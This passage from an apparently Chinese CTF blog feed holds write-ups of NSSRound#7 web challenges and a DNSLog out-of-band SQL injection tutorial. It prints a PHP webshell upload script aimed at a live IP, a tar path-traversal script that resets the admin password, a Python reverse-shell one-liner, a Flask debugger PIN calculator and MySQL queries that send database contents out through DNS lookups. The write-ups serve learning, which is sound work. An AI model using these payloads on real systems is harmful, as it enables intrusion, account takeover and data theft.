class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125; NO0o0o0o0o!</span><br></pre></td></tr></table></figure><p>这里的绕过直接看wp解释，挺详细的懒得写了<br><code>首先是各自绕过，第一层数组绕过，NSSCTF[]=1&amp;NSSCTF[]=2，第二层是in_array()第三个参数没有直接strict导致可以绕过，NsScTF=1q，第三层是伪协议NsScTf=data://text/plain,Welcome to Round7!!!，第四层nss_ctfer.vip注意变为nss[ctfer.vip(因为PHP匹配的时候会自动将[.变成下划线，有且仅变一次)，第五层是intval()绕过，字符串使用科学计数法，会默认是前面的数字，比如’1e1’转化变成1，NSScTf=114514e1，第五层直接nSScTF=1，$nSscTF=NSSRound7。这里的关键是文件上传，通过strops()检测文件的名称是否存在png，直接改增加png即可绕过，关键是会将&lt;?php die(“Round7 do you like”);写入到文件中，所以就导致了传入的虽然是php文件，但是会终止。这里也是使用上面同一个tips，使用过滤器使用文件，如php://filter/write=convert.base64-decode/resource=aiwin.png.php，让写入内容进行base64解码，这里要使用URL编码，绕过/resource=aiwin.png.php作为文件名，然后在文件写入的内容中构造base64，使得&lt;?php die(“Round7 do you like”);被不正常解码，造成死亡绕过</code><br>死亡绕过也是常见的，主要是url编码，不然就会造成resource&#x3D;aiwin.png.php作为文件名，然后就可以自己在本地写一个上传文件的HTML来抓包得到文件类型，或者直接用写脚本来上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">content = <span class="string">b&quot;&quot;&quot;aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pOz8+&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28571/Ns_SCtF.php?NSSCTF[]=1&amp;NsSCTF[]=2&amp;NsScTF=1a&amp;NsScTf=data://text/plain,Welcome%20to%20Round7!!!&amp;nss[ctfer.vip=&amp;NSScTf=114514.3&amp;nSScTF=1&amp;nSscTF=NSSRound7&quot;</span></span><br><span class="line"> </span><br><span class="line">data = &#123;<span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%31%31%31%2e%70%6e%67%2e%70%68%70&#x27;</span>, content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">resp = requests.post(url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>蚁剑连接在home下找到flag</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262157724.png" alt="image-20230226215742674"></p><p>参考：<br><a href="https://blog.csdn.net/weixin_53090346/article/details/128815454">NSSRound#7 TeamWeb学习_Aiwin-Hacker的博客-CSDN博客</a><br><a href="https://blog.csdn.net/qq_64201116/article/details/128922324">NSSRound#7_清风–的博客-CSDN博客</a><br><a href="https://www.ctfer.vip/note/set/923">NSSCTF - 文章 - NSSRound#7 Team 官方Write Up (ctfer.vip)</a></p><h1 id="新的博客"><a href="#新的博客" class="headerlink" title="新的博客"></a>新的博客</h1><p>第一个路由下可以得到一些信息</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262200347.png" alt="image-20230226220057048"></p><p>解密中间的字符得到源码</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262158964.png" alt="image-20230226215824314"></p><p>打开可以看到只要admin可以看到flag，这里其实就是利用目录穿越覆盖掉原来的userinfo.json，重置admin密码，可以参考一下CVE-2007-4559，可怜我当时还一直想着伪造session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, hashlib, json</span><br><span class="line"> </span><br><span class="line">username = <span class="string">&#x27;Joker&#x27;</span> <span class="comment"># 你注册时用的用户名，尽量别有奇怪的符号</span></span><br><span class="line">admin_passwd = <span class="string">&#x27;123456&#x27;</span> <span class="comment"># 之后要使用admin账户登陆时的密码</span></span><br><span class="line"> </span><br><span class="line">os.makedirs(<span class="string">&#x27;conf&#x27;</span>)</span><br><span class="line">os.makedirs(os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>, username]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.sep.join([os.getcwd(), <span class="string">&#x27;conf&#x27;</span>, <span class="string">&#x27;userinfo.json&#x27;</span>]), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> tFile:</span><br><span class="line">    tFile.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(admin_passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">userDataDir = os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>])</span><br><span class="line">os.system(<span class="string">f&#x27;cd &quot;<span class="subst">&#123;userDataDir&#125;</span>&quot; &amp;&amp; tar cPzvf upload.tar.gz <span class="subst">&#123;username&#125;</span>/../../conf/userinfo.json&#x27;</span>)</span><br></pre></td></tr></table></figure><p>运行之后会产生一个upload.tar.gz文件，然后用脚本中的用户名去注册一个账号登录后上传生成的upload.tar.gz文件，然后注销，用admin登录即可看到flag</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201544.png" alt="image-20230226220113486"></p><h1 id="ShadowFlag"><a href="#ShadowFlag" class="headerlink" title="ShadowFlag"></a>ShadowFlag</h1><p>先放代码，之前没接触过这类题，自己对于Linux的很多东西也不懂，趁此可以学学</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">  </span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    flag2 = f.read()  </span><br><span class="line">tag = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        <span class="keyword">return</span> f.read()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():  </span><br><span class="line">    <span class="keyword">global</span> tag  </span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:  </span><br><span class="line">        <span class="keyword">global</span> flag1  </span><br><span class="line">        <span class="keyword">del</span> flag1  </span><br><span class="line">        tag = <span class="literal">True</span>  </span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)  </span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]  </span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        os.system(action)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):  </span><br><span class="line">    sleep(<span class="number">5</span>)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;扫扫扫，扫啥东方明珠呢[怒]&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>直接看shell路由，可以弹个shell，这里过滤了空格用%09可以绕过，然后去大佬推荐的弹shell大合集里面找个python无空格的就行,[弹shell大合集](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">PayloadsAllTheThings&#x2F;Reverse Shell Cheatsheet.md at master · swisskyrepo&#x2F;PayloadsAllTheThings (github.com)</a>)<br><code>act=python%09-c%09&#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</code><br>hackbar执行拿到shell，然后这里涉及到拿flag的第一个知识点</p><blockquote><p>可以看到第一个flag是使用open打开的<code>flag1 = open(&quot;/tmp/flag1.txt&quot;, &quot;r&quot;)</code>，但是rm删除了，但是没有用close()来关闭，这样就会造成，文件虽然已经删除但是进程仍然存在，此时我们就可以在<code>/proc/[pid]/fd</code>下找到这个文件</p></blockquote><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201726.png" alt="image-20230226220131766"></p><p>这样就找到了第一段flag，然后找第二段flag，这里就涉及到高版本的flask pin值计算，因为第二个flag是用with打开<code>with open(&quot;/tmp/flag2.txt&quot;, &quot;r&quot;) as f:</code>用with打开特点是使用完后默认关闭，所以就得从flask环境中去找，即算出pin值，打开console调试去找<br>计算pin值需要得到下面这几个数值</p><blockquote><p>1.flask所登录的用户名<br>2.flask库下app.py的绝对路径<br>2.当前网络的mac地址的十进制数<br>2.docker_id和机器id</p></blockquote><p>怎么找直接写在脚本里面了，docker那里取最上面的值就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1算法，适用于高版本flask  </span></span><br><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain  </span><br><span class="line">probably_public_bits = [  </span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd 用户名 whoami </span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值  </span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值  </span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到 app.py的绝对路径  </span></span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line">private_bits = [  </span><br><span class="line">    <span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;02:42:ac:02:00:f7&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>)),  </span><br><span class="line"> <span class="comment">#/proc/sys/kernel/random/boot_id + docker_id 读取用/proc/self/cgroup或者/proc/1/cpuset  </span></span><br><span class="line">    <span class="string">&quot;e0ad2d31-1d21-4f57-b1c5-4a9036fbf235&quot;</span>+<span class="string">&quot;0dcbb0f159a0a2183aa148b6259b663635ea0a7ec4822b7da342ed08761bf47c&quot;</span>  </span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line">h = hashlib.sha1()  </span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:  </span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):  </span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">    h.update(bit)  </span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]  </span><br><span class="line">  </span><br><span class="line">num = <span class="literal">None</span>  </span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)  </span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]  </span><br><span class="line">  </span><br><span class="line">rv =<span class="literal">None</span>  </span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:  </span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)  </span><br><span class="line">                        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        rv = num  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>运行得到pin，然后在下面这里输入flag2得到</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201618.png" alt="image-20230226220150459"></p><p>参考：<br><a href="https://blog.csdn.net/qq_64201116/article/details/128922324">NSSRound#7_清风–的博客-CSDN博客</a><br><a href="https://github.com/Randark-JMT/NSSCTF-Round_v7-ShadowFlag#nssctf-round7-shadowflag">Randark-JMT&#x2F;NSSCTF-Round_v7-ShadowFlag: A reverse challenge in NSSCTF Round#7 (github.com)</a><br>这里还有一个法二，有兴趣可以看看<br><a href="https://www.cnblogs.com/nLesxw/p/web_shadowflag.html">NSS Round7_web - nLesxw - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DnsLog外带注入学习</title>
      <link href="/undefined/61825.html"/>
      <url>/undefined/61825.html</url>
      
        <content type="html"><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p> 当我们对一个数据库进行注入时，无回显，且无法进行时间注入，那么就可以利用一个通道，把查询到数据通过通道带出去，这里的通道包括：http请求、DNS解析、SMB服务等将数据带出。</p><h2 id="DNS是什么"><a href="#DNS是什么" class="headerlink" title="DNS是什么"></a>DNS是什么</h2><p><a href="https://blog.csdn.net/king9666/article/details/106022050">DNS原理及其解析过程_king9666的博客-CSDN博客</a><br>DNS( Domain Name System)是“域名系统”的英文缩写，是一种组织成域层次结构的计算机和网络服务命名系统，它用于TCP&#x2F;IP网络，它所提供的服务是用来将主机名和域名转换为IP地址的工作。DNS就是这样的一位“翻译者”.<br>同时,DNS是一个分布式数据库系统，它提供将域名转换成对应IP地址的信息。这种将名称转换成IP地址的方法称为域名解析。所以在申请域名的时候都要将域名所指向的IP地址提交给NIC。这样就要求你的IP必须是固定的才可以申请域名。<br><strong>简单来说就是将域名解析为ip</strong></p><p>然后我们找一个特定的可以记录DNS解析的网站<a href="http://dnslog.cn/">DNSLog Platform</a><br>这个网站就可以看到DNS解析记录，将回显打到这个网站从而实现注入<br>先看看网站的使用，进入点击Get SubDomain可以获得一个域名<br><img src="https://s1.ax1x.com/2022/12/28/pSSpmQS.png" alt="pSSpmQS.png"><br>然后ping一下这个域名<br><img src="https://s1.ax1x.com/2022/12/28/zzxNsH.png" alt="zzxNsH.png"><br>可以看到能够ping通，说明DNS解析成功，然后去网页点击Refresh Record可以看到解析记录<br><img src="https://s1.ax1x.com/2022/12/28/zzxJzD.png" alt="zzxJzD.png"><br>然后它也可以解析gum6ss.dnslog.cn域名下的任何子域名<br><img src="https://s1.ax1x.com/2022/12/28/zzx8JK.png" alt="zzx8JK.png"><br>同样可以在网站看到解析记录</p><h2 id="MySQL中load-file"><a href="#MySQL中load-file" class="headerlink" title="MySQL中load_file()"></a>MySQL中load_file()</h2><p>首先在我电脑<code>D:\MySQL</code>路径下准备一个a.txt文件，内容为hello!，然后利用load_file()函数读取<br><img src="https://s1.ax1x.com/2022/12/28/zzxGRO.png" alt="zzxGRO.png"><br>读取成功，这里路径必须用&#x2F;才行，而且MySQL的配置文件secure_file_priv必须为空，即secure_file_priv&#x3D;” “</p><h2 id="concat-函数"><a href="#concat-函数" class="headerlink" title="concat()函数"></a>concat()函数</h2><p>这个函数挺简单，就是用于多个字符串拼接<br><img src="https://s1.ax1x.com/2022/12/28/zzx3i6.png" alt="zzx3i6.png"></p><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p><strong>根据load_file函数的语法规则，访问互联网中的文件时，我们需要在最前面加上两个斜杠  &#x2F;&#x2F;</strong><br>然后我重新获取一个域名为d07ib5.dnslog.cn，用load_file()函数获取这个域名下的文件从而留下解析记录，这里的文件随意，因为我们的目的是留下记录，而不是查看文件<br><img src="https://s1.ax1x.com/2022/12/28/zzxlIx.png" alt="zzxlIx.png"><br>可以看到成功留下记录<br><img src="https://s1.ax1x.com/2022/12/28/zzxQd1.png" alt="zzxQd1.png"></p><h3 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h3><p>这样就可以通过此方法去注出库名等，然后我创建一个test库，使用这种方法去注入<br><img src="https://s1.ax1x.com/2022/12/28/zzxMZR.png" alt="zzxMZR.png"><br>然后可以看到得到了test库名<br><img src="https://s1.ax1x.com/2022/12/28/zzxZzF.png" alt="zzxZzF.png"></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>我们需要更改group_concat函数中的默认逗号分隔符，在使用group_concat合并查询时，会自动使用 “,” 连接我们查询到的每值，但是由于 <code>, </code>在url中是不允许出现的，所以使用group查询到的值去解析时候，mysql就会认为这不是一个url地址，就不会出现解析的操作，所以就没法获取到值，这里可以利用 . (点号) 也可以用 _ (下划线)，建议的话用点好比较好，防止数据库库名中本身存在下划线<br>这里我直接把语句放出来了，是真的容易敲错<br><code>select load_file(concat(&#39;//&#39;,(select group_concat(table_name separator  &#39;.&#39;)from information_schema.tables where table_schema=database()),&#39;.d07ib5.dnslog.cn/11.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/zzxEGT.png" alt="zzxEGT.png"><br>查询到表名<br><img src="https://s1.ax1x.com/2022/12/28/zzxVRU.png" alt="zzxVRU.png"></p><h3 id="查看字段"><a href="#查看字段" class="headerlink" title="查看字段"></a>查看字段</h3><p><code>select load_file(concat(&#39;//&#39;,(select group_concat(column_name separator  &#39;.&#39;)from information_schema.columns where table_schema=database() and table_name=&#39;table1&#39;),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/zzxmM4.png" alt="zzxmM4.png"><br>查询成功（中途换了个域名）<br><img src="https://s1.ax1x.com/2022/12/28/zzxnsJ.png" alt="zzxnsJ.png"></p><h3 id="查看数据"><a href="#查看数据" class="headerlink" title="查看数据"></a>查看数据</h3><p>当我使用下面语句<code> select load_file(concat(&#39;//&#39;,(select group_concat(id,user,name separator  &#39;.&#39;)from table1),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code>查询数据就会失效，因为<br>url中传递的字符非常有限，很多特殊字符如 <code>&#123; , &#125; , ！</code>,是无法传递的，这就会导致我们的load_file函数失效，而在flag中括号什么的会经常出现，所以使用hex进行编码<br><code>select load_file(concat(&#39;//&#39;,(select hex(group_concat(id,user,name separator  &#39;.&#39;)) from table1),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/pSSptQU.png" alt="pSSptQU.png"><br>得到<br><img src="https://s1.ax1x.com/2022/12/28/zzxuL9.png" alt="zzxuL9.png"><br>然后解码得到字段数据<br><img src="https://s1.ax1x.com/2022/12/28/zzxtQe.png" alt="zzxtQe.png"></p><p>参考：<br><a href="https://blog.csdn.net/monster663/article/details/113757235">深度剖析DNSLog注入原理&amp;本地实例测试_monster663的博客-CSDN博客_dnslog注入原理</a><br><a href="https://blog.csdn.net/king9666/article/details/106022050">DNS原理及其解析过程_king9666的博客-CSDN博客</a><br><a href="https://www.freebuf.com/articles/web/259023.html">DNSlog注入详细解析 - FreeBuf网络安全行业门户</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
